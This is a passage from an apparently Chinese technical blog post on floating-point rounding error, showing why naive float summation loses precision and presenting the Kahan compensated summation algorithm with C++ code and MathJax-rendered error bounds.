<p><strong>稳定计算方式</strong> <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="24.922ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 11015.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1955.7,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2445.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3112.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4168.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4557.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5351.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(6351.7,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6841.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7452.9,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(7953.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8342.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(9136.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(10136.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(10626.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 其误差上界为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="8.979ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 3968.9 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(628.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1128.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(1406.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(2200.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3200.9,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3690.9,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container></span> 显然，新的计算方式避免了数值放大问题，并且只需要 <strong>2
次加法和 1 次乘法</strong>，比原来的 <strong>1 次减法和 2
次乘法</strong> 更高效。</p>
<h5 id="kahan-求和算法">Kahan 求和算法</h5>
<p>标准的浮点数求和算法如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>如果数值的数量级不同（特别是存在非常大的数和非常小的数），则相对误差不再仅仅是
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.762ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2547 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1752,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(2158,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>，而是
<strong>严重依赖输入数据</strong>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> n = (<span class="number">1</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, n);  <span class="comment">// 打印 16777216</span></span><br><span class="line"></span><br><span class="line"><span class="type">float</span> s = n;  <span class="comment">// 2^24</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    s += <span class="number">1.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f\n"</span>, s);  <span class="comment">// 仍然是 16777216.000000</span></span><br></pre></td></tr></table></figure></div>
<p>这里 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="6.816ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 3012.6 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2512.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></span> 超出了
<code>float</code> 的 <strong>23 位尾数（mantissa）</strong>
所能精确表示的范围，因此所有的 <code>+1.0</code> 操作
<strong>都会被舍入掉</strong>，导致最终的计算结果没有变化。</p>
<p>这种情况表明，<strong>绝对误差</strong> 为 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.762ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2547 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1752,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(2158,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>，而不是
<strong>相对误差</strong>，这意味着即使 <code>n</code>
变大，错误也不会自动被归一化，而是会无限增长。</p>
<p><strong>Kahan 求和算法核心思想</strong></p>
<p>为了减少舍入误差，我们可以将
<strong>未被累加的部分存储起来</strong>，并在后续计算中补偿它：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> s = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">    <span class="type">float</span> y = a[i] - c;  <span class="comment">// 计算当前值减去累积误差</span></span><br><span class="line">    <span class="type">float</span> t = s + y;     <span class="comment">// 计算新的和</span></span><br><span class="line">    c = (t - s) - y;     <span class="comment">// 计算新的误差</span></span><br><span class="line">    s = t;               <span class="comment">// 更新和</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ol type="1">
<li><code>y = a[i] - c</code> ：提取 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="3.235ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1430 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(529,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(807,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1152,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> 的
<strong>低精度部分</strong>。</li>
<li><code>t = s + y</code> ：执行加法，但 <code>y</code>
可能过小以至于无法准确表示。</li>
<li><code>c = (t - s) - y</code> ：从计算结果 <code>t</code>
中恢复被丢弃的低精度部分，并存入 <code>c</code> 进行下一轮补偿。</li>
</ol>
<p>Kahan 求和的 <strong>相对误差上界</strong> 为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.566ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 5112 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(1128.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2128.4,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(2891.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3280.4,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="msup" 